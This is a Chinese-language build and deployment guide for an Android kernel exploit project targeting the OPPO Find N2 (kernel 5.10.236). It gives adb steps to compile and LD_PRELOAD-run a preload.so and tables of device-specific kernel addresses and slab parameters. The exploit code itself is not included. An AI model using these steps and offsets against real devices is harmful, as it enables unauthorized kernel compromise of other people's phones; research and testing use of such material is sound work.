# 环境搭建与部署文档

## 依赖清单

### 软件依赖

| 组件 | 版本 | 用途 | 安装方式 |
|------|------|------|----------|
| Android NDK | r29 | 交叉编译 exploit | 下载解压到 `/tmp/ndk_extract/android-ndk-r29` |
| ADB | 37.0+ | Android 设备交互 | `brew install android-platform-tools` |
| Python | 3.8+ | 服务器脚本 | 系统自带或 brew install |
| IDA Pro | 7.0+ | 二进制分析 (可选) | 商业软件 |
| Make | - | 构建系统 | 系统自带 |

### 硬件依赖

| 组件 | 要求 |
|------|------|
| 目标设备 | OPPO Find N2 (SM8475/CPH2413) |
| USB 连接 | ADB 调试模式 |
| 内核版本 | 5.10.236 (CONFIG_FUTEX_PI=y) |

## 本地开发环境搭建

### 1. 安装 Android NDK

```bash
# 下载 NDK r29
# 解压到指定路径
mkdir -p /tmp/ndk_extract
cd /tmp/ndk_extract
# 下载并解压 android-ndk-r29-darwin.dmg 或 zip

# 验证安装
/tmp/ndk_extract/android-ndk-r29/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang --version
```

> [!WARNING]
> 必须使用 NDK r29 的 `aarch64-linux-android35-clang`。使用 android35 以外的版本可能导致 shadow stack OOM。

### 2. 安装 ADB

```bash
# macOS
brew install android-platform-tools

# 验证安装
adb version
```

### 3. 连接设备

```bash
# 启用 USB 调试
# 设置 → 开发者选项 → USB 调试 → 开启

# 验证连接
adb devices
# 应显示: 84cb96e2    device
```

### 4. 编译 exploit

```bash
cd exploit/
make NDK=/tmp/ndk_extract/android-ndk-r29

# 验证编译成功
ls -la preload.so
# 应显示: -rwxr-xr-x  ... preload.so
```

### 5. 部署到设备

```bash
adb push preload.so /data/local/tmp/
adb shell 'chmod 755 /data/local/tmp/preload.so'
```

### 6. 运行测试

```bash
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
```

## 配置项全解

### target.h 配置

| 配置名 | 值 | 说明 |
|--------|-----|------|
| `KERNELSNITCH_IDENTITY_START` | `0xffffff8000000000ULL` | direct-map 起始地址 |
| `KERNELSNITCH_IDENTITY_END` | `0xffffffc000000000ULL` | direct-map 结束地址 (16GB) |
| `PSELECT_WAITER_WORD_SHIFT` | 0 | waiter word 偏移 |
| `P0_PAGE_OFFSET` | `0xffffff8000000000ULL` | 39-bit VA direct map 基址 |
| `P0_KERNEL_PHYS_LOAD` | `0xa8000000ULL` | XBL firmware verified |

### common.h 配置

| 配置名 | 值 | 说明 |
|--------|-----|------|
| `MM_STRUCT_SZ` | `0x3c0` | mm_struct 大小 (pahole 验证) |
| `MM_ORDER` | 3 | SLUB order (32KB slab) |
| `KSNITCH_COLLISIONS` | 16 | 碰撞搜索目标数 |
| `PSELECT_ROUTE_NFDS` | 320 | pselect NFDS 值 |

## 升级与回滚

### 升级步骤

1. 修改源代码
2. `make clean && make NDK=/tmp/ndk_extract/android-ndk-r29`
3. `adb push preload.so /data/local/tmp/`
4. 测试验证

### 回滚方案

```bash
# 回滚到特定 commit
git log --oneline  # 查看 commit 历史
git checkout <commit-hash> -- exploit/

# 重新编译
make clean && make NDK=/tmp/ndk_extract/android-ndk-r29
```
